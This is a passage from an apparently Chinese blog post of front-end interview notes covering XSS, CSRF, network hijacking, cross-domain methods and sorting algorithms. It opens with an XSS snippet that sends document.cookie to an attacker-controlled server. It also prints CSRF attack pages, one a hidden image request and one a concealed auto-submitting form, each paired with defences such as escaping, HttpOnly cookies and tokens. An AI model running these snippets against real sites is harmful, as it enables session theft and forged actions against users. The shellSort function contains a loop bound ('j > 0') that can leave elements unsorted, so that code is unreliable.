class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$.ajax({</span><br><span class="line">    url: '自己的服务器',</span><br><span class="line">    dataType: 'jsonp',</span><br><span class="line">    data: {'盗取的用户cookie': document.cookie}</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><h4 id="如何防范"><a href="#如何防范" class="headerlink" title="如何防范"></a>如何防范</h4><p>目前来讲，最简单的办法防治办法，还是将前端输出数据都进行转义最为稳妥。比如，按照刚刚我们那个例子来说，其本质是，浏览器遇到script标签的话，则会执行其中的脚本。但是如果我们将script标签的进行转义，则浏览器便不会认为其是一个标签，但是显示的时候，还是会按照正常的方式去显示，代码如下，效果如图</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><?php</span></span><br><span class="line">    $username=<span class="string">"<script>alert('侯医生');</script>"</span>;</span><br><span class="line"><span class="meta">?></span></span><br><span class="line"><!DOCYTPE HTML></span><br><span class="line"><html></span><br><span class="line">    <head></span><br><span class="line">        <meta charset=<span class="string">"utf-8"</span> /></span><br><span class="line">    </head></span><br><span class="line">    <body></span><br><span class="line">        <!--我们将输出的后端变量，转义之后再输出，则可以避免被注入代码--></span><br><span class="line">        <div></span><br><span class="line">            用户名：<span class="meta"><?php</span> <span class="keyword">echo</span> htmlentities($username);<span class="meta">?></span></span><br><span class="line">        </div></span><br><span class="line">        <div></span><br><span class="line">            第一条状态：侯医生的状态<span class="number">1</span></span><br><span class="line">        </div></span><br><span class="line">        <div></span><br><span class="line">            第二条状态：侯医生的状态<span class="number">2</span></span><br><span class="line">        </div></span><br><span class="line">        <div></span><br><span class="line">            第三条状态：侯医生的状态<span class="number">3</span></span><br><span class="line">        </div></span><br><span class="line">    </body></span><br><span class="line"></html></span><br></pre></td></tr></tbody></table></figure><p><img src="https://segmentfault.com/img/bVB9qd" alt="image"></p><p>其实，我们再来看看网页源码，如图1.2.2</p><p><img src="https://segmentfault.com/img/bVB9qG" alt="image"><br>虽然显示出来是有script标签的，但是实际上，script标签的左右尖括号(><)，均被转义为html字符实体，所以，便不会被当做标签来解析的，但是实际显示的时候，这两个尖括号，还是可以正常展示的。</p><h4 id="升级防御"><a href="#升级防御" class="headerlink" title="升级防御"></a>升级防御</h4><p>我们将输出的字符串中的\反斜杠进行转义(json转义)。这样，\就不会被当做unicode码的开头来被处理了。代码如下：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById('username_info').innerHTML = <?php echo json_encode(htmlentities($username));?>;</span><br></pre></td></tr></tbody></table></figure><p>都说了道高一尺魔高一丈了，你以为防得住后端输出，黑客大大们就没办法攻击了吗。我们有的时候，会有一些习惯，拿URL上的get参数去构建网页。好比说，直接拿url上的用户名去展示啦，拿url上的一些回跳地址之类的。但是url上的参数，我们是无法提前对其进行转义的。接下来，来个例子，代码如下：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><html></span><br><span class="line">    <head></span><br><span class="line">        <meta charset="utf-8" /></span><br><span class="line">        <script src="https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js"></script></span><br><span class="line">    </head></span><br><span class="line">    <body></span><br><span class="line">        <div></span><br><span class="line">            用户名：<?php echo htmlentities($username);?></span><br><span class="line">        </div></span><br><span class="line">        <div></span><br><span class="line">            第一条状态：侯医生的状态1</span><br><span class="line">        </div></span><br><span class="line">        <div></span><br><span class="line">            第二条状态：侯医生的状态2</span><br><span class="line">        </div></span><br><span class="line">        <div></span><br><span class="line">            第三条状态：侯医生的状态3</span><br><span class="line">        </div></span><br><span class="line">        <div>版权所有：<span id="username_info"></span></div></span><br><span class="line">        <script></span><br><span class="line">            var param = /=(.+)$/.exec(location.search);</span><br><span class="line">            var value = decodeURIComponent(param[1]);</span><br><span class="line">            $('#username_info').append(value);</span><br><span class="line">        </script></span><br><span class="line">    </body></span><br><span class="line"></html></span><br></pre></td></tr></tbody></table></figure><p>上述代码，满足了一个很正常的需求，解开URL中的一个参数，并将其渲染至页面上。但是，这里面存在一个风险，如果黑客在URL的这个参数中，加入js代码，这样便又会被执行。</p><p><img src="https://segmentfault.com/img/bVB9zm" alt="image"></p><p>像这种从url中获取的信息，笔者建议，最好由后端获取，在前端转义后再行输出，代码如下，效果如图</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><script></span><br><span class="line">    var value = decodeURIComponent("<?php echo htmlentities($_GET['username']);?>");</span><br><span class="line">    $('#username_info').append(value);</span><br><span class="line"></script></span><br></pre></td></tr></tbody></table></figure><p><img src="https://segmentfault.com/img/bVB9zP" alt="image"></p><p>如果不幸中招了，黑客的js真的在我们的网页上执行了，我们该怎么办。其实，很多时候，我们的敏感信息都是存储在cookie中的（不要把用户机密信息放在网页中），想要阻止黑客通过js访问到cookie中的用户敏感信息。那么请使用cookie的HttpOnly属性，加上了这个属性的cookie字段，js是无法进行读写的。php的设置方法如下：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><?php</span><br><span class="line">    setcookie("userpass", "doctorhou-shuai", NULL, NULL, NULL, NULL, TRUE);</span><br><span class="line">?></span><br></pre></td></tr></tbody></table></figure><p>如图，我们的cookie已经种上了，并且有了httpOnly标识<br><img src="https://segmentfault.com/img/bVB9Hh" alt="image"><br>我们通过js无法获取cookie中的设定有httpOnly的字段：<br><img src="https://segmentfault.com/img/bVB9Hv" alt="image"></p><h3 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h3><p>CSRF攻击在百度百科中的解释是：<br>CSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。<br>其实就是网站中的一些提交行为，被黑客利用，你在访问黑客的网站的时候，进行的操作，会被操作到其他网站上(如：你所使用的网络银行的网站)。</p><h4 id="如何攻击？"><a href="#如何攻击？" class="headerlink" title="如何攻击？"></a>如何攻击？</h4><h5 id="要合理使用post与get"><a href="#要合理使用post与get" class="headerlink" title="要合理使用post与get"></a>要合理使用post与get</h5><p>通常我们会为了省事儿，把一些应当提交的数据，做成get请求。殊不知，这不仅仅是违反了http的标准而已，也同样会被黑客所利用。比如，你开发的网站中，有一个购买商品的操作。你是这么开发的：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><?php</span><br><span class="line">// 从cookie中获取用户名，看似稳妥</span><br><span class="line">$username = $_COOKIE['username'];</span><br><span class="line">$productId = $_GET['pid'];</span><br><span class="line">// 这里进行购买操作</span><br><span class="line">//store_into_database($username, $productId);</span><br><span class="line">?></span><br><span class="line"><meta charset="utf-8" /></span><br><span class="line"><?php</span><br><span class="line">echo $username . '买入商品：' . $productId;</span><br><span class="line">?></span><br></pre></td></tr></tbody></table></figure><p>而商品ID图个省事儿，就使用了url中的get参数。买商品的话，如图</p><p><img src="https://segmentfault.com/img/bVB9Ca" alt="image"></p><p>那么，黑客的网站可以这样开发：<br><!DOCYTPE HTML></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><html></span><br><span class="line">    <head></span><br><span class="line">        <meta charset="utf-8" /></span><br><span class="line">    </head></span><br><span class="line">    <body></span><br><span class="line">        <img src="http://localhost:8082/lab/xsrflab/submit.php?pid=1" /></span><br><span class="line">    </body></span><br><span class="line"></html></span><br></pre></td></tr></tbody></table></figure><p>这样的话，用户只需要访问一次黑客的网站，其实就相当于在你的网站中，操作了一次。然而用户却没有感知。</p><p>如果你使用了post请求来处理关键业务的，还是有办法可以破解的。我们的业务代码如下：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><?php</span><br><span class="line">$username = $_COOKIE['username'];</span><br><span class="line">// 换为post了，可以规避黑客直接的提交</span><br><span class="line">$productId = $_POST['pid'];</span><br><span class="line">// 这里进行购买操作</span><br><span class="line">//store_into_database($username, $productId);</span><br><span class="line">?></span><br><span class="line"><meta charset="utf-8" /></span><br><span class="line"><?php</span><br><span class="line">echo $username . '买入商品：' . $productId;</span><br><span class="line">?></span><br></pre></td></tr></tbody></table></figure><p>黑客代码如下：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><!DOCYTPE HTML></span><br><span class="line"><html></span><br><span class="line">    <head></span><br><span class="line">        <meta charset="utf-8" /></span><br><span class="line">        <script src="https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js"></script></span><br><span class="line">    </head></span><br><span class="line">    <body></span><br><span class="line">        <button id="clickme">点我看相册</button></span><br><span class="line">        <script></span><br><span class="line">            $('#clickme').on('click', function () {</span><br><span class="line">                // 用户再不知情的情况下，提交了表单，服务器这边也会以为是用户提交过来的。</span><br><span class="line">                $('#myform').submit();</span><br><span class="line">            });</span><br><span class="line">        </script></span><br><span class="line">        <form id="myform" style="display:none;" target="myformer" method="post" action="http://myhost:8082/lab/xsrflab/submit.php"></span><br><span class="line">            <input type="hidden" name="pid" value="1"></span><br><span class="line">        </form></span><br><span class="line">        <iframe name="myformer" style="display:none;"></iframe></span><br><span class="line">    </body></span><br><span class="line"></html></span><br></pre></td></tr></tbody></table></figure><p>效果如图</p><p><img src="https://segmentfault.com/img/bVB9DR" alt="image"></p><p>点击后，用户进行了提交，却连自己都不知情。这种情况如何防御呢？</p><p>最简单的办法就是加验证码，这样除了用户，黑客的网站是获取不到用户本次session的验证码的。但是这样也会降低用户的提交体验，特别是有些经常性的操作，如果总让用户输入验证码，用户也会非常的烦。</p><p>另一种方式，就是在用访问的页面中，都种下验证用的token，用户所有的提交都必须带上本次页面中生成的token，这种方式的本质和使用验证码没什么两样，但是这种方式，整个页面每一次的session，使用同一个token就行，很多post操作，开发者就可以自动带上当前页面的token。如果token校验不通过，则证明此次提交并非从本站发送来，则终止提交过程。如果token确实为本网站生成的话，则可以通过</p><h3 id="网络劫持攻击"><a href="#网络劫持攻击" class="headerlink" title="网络劫持攻击"></a>网络劫持攻击</h3><p>很多的时候，我们的网站不是直接就访问到我们的服务器上的，中间会经过很多层代理，如果在某一个环节，数据被中间代理层的劫持者所截获，他们就能获取到使用你网站的用户的密码等保密数据。比如，我们的用户经常会在各种饭馆里面，连一些奇奇怪怪的wifi，如果这个wifi是黑客所建立的热点wifi，那么黑客就可以结果该用户收发的所有数据。这里，建议站长们网站都使用https进行加密。这样，就算网站的数据能被拿到，黑客也无法解开。</p><p>如果你的网站还没有进行https加密的化，则在表单提交部分，最好进行非对称加密–即客户端加密，只有服务端能解开。这样中间的劫持者便无法获取加密内容的真实信息了。</p><h3 id="控制台注入代码"><a href="#控制台注入代码" class="headerlink" title="控制台注入代码"></a>控制台注入代码</h3><h3 id="我们平时开发要注意些什么？"><a href="#我们平时开发要注意些什么？" class="headerlink" title="我们平时开发要注意些什么？"></a>我们平时开发要注意些什么？</h3><ul><li>开发时要提防用户产生的内容，要对用户输入的信息进行层层检测</li><li>要注意对用户的输出内容进行过滤(进行转义等)</li><li>重要的内容记得要加密传输(无论是利用https也好，自己加密也好)</li><li>get请求与post请求，要严格遵守规范，不要混用，不要将一些危险的提交使用jsonp完成。</li><li>对于URL上携带的信息，要谨慎使用。</li><li>心中时刻记着，自己的网站哪里可能有危险。</li></ul><h2 id="2-跨域"><a href="#2-跨域" class="headerlink" title="==2. 跨域=="></a>==2. 跨域==</h2><p>受浏览器同源策略的限制，本域的js不能操作其他域的页面对象（比如DOM）。但在安全限制的同时也给注入iframe或是ajax应用上带来了不少麻烦。所以我们要通过一些方法使本域的js能够操作其他域的页面对象或者使其他域的js能操作本域的页面对象</p><p>单向跨域（一般用于获取数据）</p><h3 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h3><p>原理：因为通过script标签引入的js是不受同源策略的限制的（正如前文提到的baidu.com的页面加载了google.com的js）。所以我们可以通过script标签引入一个js或者是一个其他后缀形式（如php，jsp等）的文件，此文件返回一个js函数的调用，如返回JSONP_getUsers([“paco”,”john”,”lili”])，也就是说此文件返回的结果调用了JSONP_getUsers函数，并且把[“paco”,”john”,”lili”]传进去，这个[“paco”,”john”,”lili”]是一个用户列表。那么如果此时我们的页面中有一个JSONP_getUsers函数，那么JSONP_getUsers就被调用到，并且传入了用户列表。此时就实现了在本域获取其他域数据的功能，也就是跨域</p><h3 id="动态创建script标签"><a href="#动态创建script标签" class="headerlink" title="动态创建script标签"></a>动态创建script标签</h3><p>这种方法其实是JSONP跨域的简化版，JSONP只是在此基础上加入了回调函数。</p><h3 id="Access-Control"><a href="#Access-Control" class="headerlink" title="Access Control"></a>Access Control</h3><p>此跨域方法目前只在很少的浏览器中得以支持，这些浏览器可以发送一个跨域的HTTP请求（Firefox, Google Chrome等通过XMLHTTPRequest实现，IE8下通过XDomainRequest实现），请求的响应必须包含一个Access- Control-Allow-Origin的HTTP响应头，该响应头声明了请求域的可访问权限。例如baidu.com对google.com下的getUsers.php发送了一个跨域的HTTP请求（通过ajax），那么getUsers.php必须加入如下的响应头：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header("Access-Control-Allow-Origin: http://www.baidu.com");//表示允许baidu.com跨域请求本文件</span><br></pre></td></tr></tbody></table></figure><h3 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h3><p>window 对象的name属性是一个很特别的属性，当该window的location变化，然后重新加载，它的name属性可以依然保持不变。那么我们可以在页面 A中用iframe加载其他域的页面B，而页面B中用JavaScript把需要传递的数据赋值给window.name，iframe加载完成之后（iframe.onload），页面A修改iframe的地址，将其变成同域的一个地址，然后就可以读出iframe的window.name的值了（因为A中的window.name和iframe中的window.name互相独立的，所以不能直接在A中获取window.name，而要通过iframe获取其window.name）。这个方式非常适合单向的数据请求，而且协议简单、安全。不会像JSONP那样不做限制地执行外部脚本。</p><h3 id="服务器代理"><a href="#服务器代理" class="headerlink" title="服务器代理"></a>服务器代理</h3><p>在数据提供方没有提供对JSONP协议或者 window.name协议的支持，也没有对其它域开放访问权限时，我们可以通过server proxy的方式来抓取数据。例如当baidu.com域下的页面需要请求google.com下的资源文件getUsers.php时，直接发送一个指向 google.com/getUsers.php的Ajax请求肯定是会被浏览器阻止。这时，我们在baidu.com下配一个代理，然后把Ajax请求绑定到这个代理路径下，例如baidu.com/proxy/, 然后这个代理发送HTTP请求访问google.com下的getUsers.php，跨域的HTTP请求是在服务器端进行的（服务器端没有同源策略限制），客户端并没有产生跨域的Ajax请求。这个跨域方式不需要和目标资源签订协议，带有侵略性。</p><h3 id="document-domain（两个iframe之间）"><a href="#document-domain（两个iframe之间）" class="headerlink" title="document.domain（两个iframe之间）"></a>document.domain（两个iframe之间）</h3><p>通过修改document的domain属性，我们可以在域和子域或者不同的子域之间通信。同域策略认为域和子域隶属于不同的域，比如baidu.com和 youxi.baidu.com是不同的域，这时，我们无法在baidu.com下的页面中调用youxi.baidu.com中定义的JavaScript方法。但是当我们把它们document的domain属性都修改为baidu.com，浏览器就会认为它们处于同一个域下，那么我们就可以互相获取对方数据或者操作对方DOM了。</p><p>问题：<br>1、安全性，当一个站点被攻击后，另一个站点会引起安全漏洞。<br>2、如果一个页面中引入多个iframe，要想能够操作所有iframe，必须都得设置相同domain。</p><h3 id="location-hash（两个iframe之间），又称FIM，Fragment-Identitier-Messaging的简写"><a href="#location-hash（两个iframe之间），又称FIM，Fragment-Identitier-Messaging的简写" class="headerlink" title="location.hash（两个iframe之间），又称FIM，Fragment Identitier Messaging的简写"></a>location.hash（两个iframe之间），又称FIM，Fragment Identitier Messaging的简写</h3><p>因为父窗口可以对iframe进行URL读写，iframe也可以读写父窗口的URL，URL有一部分被称为hash，就是#号及其后面的字符，它一般用于浏览器锚点定位，Server端并不关心这部分，应该说HTTP请求过程中不会携带hash，所以这部分的修改不会产生HTTP请求，但是会产生浏览器历史记录。此方法的原理就是改变URL的hash部分来进行双向通信。每个window通过改变其他 window的location来发送消息（由于两个页面不在同一个域下IE、Chrome不允许修改parent.location.hash的值，所以要借助于父窗口域名下的一个代理iframe），并通过监听自己的URL的变化来接收消息。这个方式的通信会造成一些不必要的浏览器历史记录，而且有些浏览器不支持onhashchange事件，需要轮询来获知URL的改变，最后，这样做也存在缺点，诸如数据直接暴露在了url中，数据容量和类型都有限等。</p><h3 id="使用HTML5的postMessage方法（两个iframe之间或者两个页面之间）"><a href="#使用HTML5的postMessage方法（两个iframe之间或者两个页面之间）" class="headerlink" title="使用HTML5的postMessage方法（两个iframe之间或者两个页面之间）"></a>使用HTML5的postMessage方法（两个iframe之间或者两个页面之间）</h3><p>高级浏览器Internet Explorer 8+, chrome，Firefox , Opera  和 Safari 都将支持这个功能。这个功能主要包括接受信息的”message”事件和发送消息的”postMessage”方法。比如baidu.com域的A页面通过iframe嵌入了一个google.com域的B页面，可以通过以下方法实现A和B的通信</p><p>A页面通过postMessage方法发送消息：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">window.onload = function() {  </span><br><span class="line">    var ifr = document.getElementById('ifr');  </span><br><span class="line">    var targetOrigin = "http://www.google.com";  </span><br><span class="line">    ifr.contentWindow.postMessage('hello world!', targetOrigin);  </span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>postMessage的使用方法：</p><p>otherWindow.postMessage(message, targetOrigin);</p><p>otherWindow:   指目标窗口，也就是给哪个window发消息，是 window.frames 属性的成员或者由 window.open 方法创建的窗口<br>message:   是要发送的消息，类型为 String、Object (IE8、9 不支持)<br>targetOrigin:   是限定消息接收范围，不限制请使用 ‘*’</p><p>B页面通过message事件监听并接受消息:  </p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var onmessage = function (event) {  </span><br><span class="line">  var data = event.data;//消息  </span><br><span class="line">  var origin = event.origin;//消息来源地址  </span><br><span class="line">  var source = event.source;//源Window对象  </span><br><span class="line">  if(origin=="http://www.baidu.com"){  </span><br><span class="line">console.log(data);//hello world!  </span><br><span class="line">  }  </span><br><span class="line">};  </span><br><span class="line">if (typeof window.addEventListener != 'undefined') {  </span><br><span class="line">  window.addEventListener('message', onmessage, false);  </span><br><span class="line">} else if (typeof window.attachEvent != 'undefined') {  </span><br><span class="line">  //for ie  </span><br><span class="line">  window.attachEvent('onmessage', onmessage);  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="3-一次完整的HTTP事务是怎样的一个过程？"><a href="#3-一次完整的HTTP事务是怎样的一个过程？" class="headerlink" title="==3.一次完整的HTTP事务是怎样的一个过程？=="></a>==3.一次完整的HTTP事务是怎样的一个过程？==</h2><p>基本流程：<br>a. 域名解析<br>b. 发起TCP的3次握手<br>c. 建立TCP连接后发起http请求<br>d. 服务器端响应http请求，浏览器得到html代码<br>e. 浏览器解析html代码，并请求html代码中的资源<br>f. 浏览器对页面进行渲染呈现给用户</p><h2 id="4-排序算法"><a href="#4-排序算法" class="headerlink" title="==4. 排序算法=="></a>==4. 排序算法==</h2><p><img src="http://oe51jhwvd.bkt.clouddn.com/1.png" alt="image"></p><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><p>两两比较，若反则交换位置<br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bubbleSort</span>(<span class="params">arr</span>) </span>{</span><br><span class="line">    <span class="keyword">var</span> len = arr.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i < len; i++) {</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j < len - <span class="number">1</span> - i; j++) {</span><br><span class="line">            <span class="keyword">if</span> (arr[j] > arr[j+<span class="number">1</span>]) {        <span class="comment">//相邻元素两两对比</span></span><br><span class="line">                <span class="keyword">var</span> temp = arr[j+<span class="number">1</span>];        <span class="comment">//元素交换</span></span><br><span class="line">                arr[j+<span class="number">1</span>] = arr[j];</span><br><span class="line">                arr[j] = temp;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><p>每次都找最小的数<br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectionSort</span>(<span class="params">arr</span>) </span>{</span><br><span class="line">    <span class="keyword">var</span> len = arr.length;</span><br><span class="line">    <span class="keyword">var</span> minIndex, temp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i < len - <span class="number">1</span>; i++) {</span><br><span class="line">        minIndex = i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = i + <span class="number">1</span>; j < len; j++) {</span><br><span class="line">            <span class="keyword">if</span> (arr[j] < arr[minIndex]) {     <span class="comment">//寻找最小的数</span></span><br><span class="line">                minIndex = j;                 <span class="comment">//将最小数的索引保存</span></span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        temp = arr[i];</span><br><span class="line">        arr[i] = arr[minIndex];</span><br><span class="line">        arr[minIndex] = temp;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertionSort</span>(<span class="params">arr</span>) </span>{</span><br><span class="line">    <span class="keyword">var</span> len = arr.length;</span><br><span class="line">    <span class="keyword">var</span> preIndex, current;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i < len; i++) {</span><br><span class="line">        preIndex = i - <span class="number">1</span>;</span><br><span class="line">        current = arr[i];</span><br><span class="line">        <span class="keyword">while</span>(preIndex >= <span class="number">0</span> && arr[preIndex] > current) {</span><br><span class="line">            arr[preIndex+<span class="number">1</span>] = arr[preIndex];</span><br><span class="line">            preIndex--;</span><br><span class="line">        }</span><br><span class="line">        arr[preIndex+<span class="number">1</span>] = current;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h3><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellSort</span>(<span class="params">arr</span>) </span>{</span><br><span class="line">    <span class="keyword">var</span> len = arr.length,</span><br><span class="line">        temp,</span><br><span class="line">        gap = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(gap < len/<span class="number">3</span>) {          <span class="comment">//动态定义间隔序列</span></span><br><span class="line">        gap =gap*<span class="number">3</span>+<span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span> (gap; gap> <span class="number">0</span>; gap = <span class="built_in">Math</span>.floor(gap/<span class="number">3</span>)) {</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = gap; i < len; i++) {</span><br><span class="line">            temp = arr[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> j = i-gap; j > <span class="number">0</span> && arr[j]> temp; j-=gap) {</span><br><span class="line">                arr[j+gap] = arr[j];</span><br><span class="line">            }</span><br><span class="line">            arr[j+gap] = temp;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p><img src="http://oe51jhwvd.bkt.clouddn.com/5.gif" alt="image"><br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span>(<span class="params">arr</span>) </span>{  <span class="comment">//采用自上而下的递归方法</span></span><br><span class="line">    <span class="keyword">var</span> len = arr.length;</span><br><span class="line">    <span class="keyword">if</span>(len < <span class="number">2</span>) {</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    }</span><br><span class="line">    <span 